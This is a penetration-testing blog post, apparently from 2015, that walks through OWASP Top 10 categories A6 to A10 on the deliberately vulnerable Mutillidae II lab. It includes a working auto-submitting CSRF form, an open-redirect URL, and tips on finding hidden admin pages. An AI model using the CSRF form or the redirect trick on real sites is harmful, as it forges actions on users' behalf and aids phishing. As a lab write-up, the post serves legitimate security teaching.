---
categories:
- pentest
- web
comments: false
date: 2015-02-06T04:29:36Z
title: OWASP Top 10 in Mutillidae (Part2)
url: /2015/02/06/owasp-top-10-in-mutillidae-part-2/
---

This post is continuation from [previous post][prev]. We explore less common, however, still potentially very dangerous *OWASP Top 10* threats. 
Here we go through 6th to 10th places in the list.

[prev]: /2015/02/03/owasp-top-10-in-mutillidae/ "Part 1"

<!--more-->

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.

Sensitive data can be extracted from HTML storage, HTTP headers or in this example even from HTML comments in the page source code (*index.php*):

{{<highlight html>}}
<!-- I think the database password is set to blank or perhaps samurai.
It depends on whether you installed this web app from irongeeks site or
are using it inside Kevin Johnsons Samurai web testing framework.
It is ok to put the password in HTML comments because no user will ever see
this comment. I remember that security instructor saying we should use the
framework comment symbols (ASP.NET, JAVA, PHP, Etc.)
rather than HTML comments, but we all know those
security instructors are just making all this up. -->			<!-- End Content -->
{{</highlight>}}

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.

First example in mutillidae is the `robots.txt` file:

```
User-agent: *
Disallow: passwords/
Disallow: config.inc
Disallow: classes/
Disallow: javascript/
Disallow: owasp-esapi-php/
Disallow: documentation/
Disallow: phpmyadmin/
Disallow: includes/
```

While it prevents web crawlers from indexing these files and folders, it also gives the attacker information about the structure of the website. And in this case even provides with sensitive information directly (The *passwords* folder
contains information about few legitimate accounts). 

Another "security by obscurity" example is "secret" administrative or configuration pages. Using Burp-Intruder in sniper mode or dirbuster we could find secret pages. Sometimes they are very obvious such as 
*secret.php, admin.php, administrator.php*. In our case `phpmyadmin.php` page is accessible to anyone, even anonymous user.

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim's browser to send a forged HTTP request, including the victim's session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim's browser to generate requests the vulnerable application thinks are legitimate requests from the victim.

The `add-to-your-blog.php` page is vulnerable to CSRF. We can intercept the POST request with burp: 

![burp](/images/2015/02/06/burp.png)

Using this information we can construct a malicious form which submits the data upon loading the page (onload function):

{{<codecaption lang="html" title="HTML Injection">}}
<html>
    <body onload="document.createElement('form').submit.call(document.getElementById('evil'))">
        <form id="evil" action="http://192.168.1.66/mutillidae/index.php?page=add-to-your-blog.php" method="post" enctype="application/x-www-form-urlencoded"> 
            <input type="hidden" name="csrf-token" value=""/> 
            <input type="hidden" name="blog_entry" value="I made you post this!"/> 
            <input type="hidden" name="add-to-your-blog-php-submit-button" value="Save+Blog+Entry"/> 
        </form>
    </body>
</html>
{{</codecaption>}}

If logged in user (with a valid session token) visits this malicious page, then a new blog post is made on the users behalf:

![blog](/images/2015/02/06/blog.png)

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.

In our case obtaining information about the server components is pretty easy (*phpinfo.php*):

![info](/images/2015/02/06/info.png)

However, in this case the server components have no known vulnerabilities (at the time of writing).

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.

In our case the credits page is vulnerable to unvalidated redirect. 

`http://192.168.1.66/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.owasp.org`

Here, the `forwardurl` specifies the redirection url and the attacker can point to a malicious page. Unvalidated redirects can increase the success rate in phishing attacks, because the first part of the link looks "legit".

## Summary

*OWASP Top 10* describes most common web vulnerabilities found in the real world. *Mutillidae II* is deliberately vulnerable web application and contains at least one vulnerability from each OWASP category. It provides good
insight into majority of web related exploitation methods.

